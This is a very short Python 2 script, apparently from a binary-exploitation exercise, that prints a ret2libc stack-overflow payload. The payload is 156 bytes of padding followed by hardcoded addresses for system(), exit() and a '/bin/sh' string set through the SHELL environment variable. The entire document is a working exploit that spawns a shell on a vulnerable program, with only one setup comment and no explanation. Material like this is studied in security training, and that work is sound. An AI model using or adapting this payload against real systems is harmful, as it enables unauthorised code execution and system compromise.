# Make sure to change the SHELL environment variable to container the string "/bin/sh"

system_addr = "\xd0\xae\xe6\xf7"
exit_addr = "\x70\xeb\xe5\xf7"
shell_addr = "\xec\x97\xf8\xf7"

print "A" * 156 + system_addr + exit_addr + shell_addr
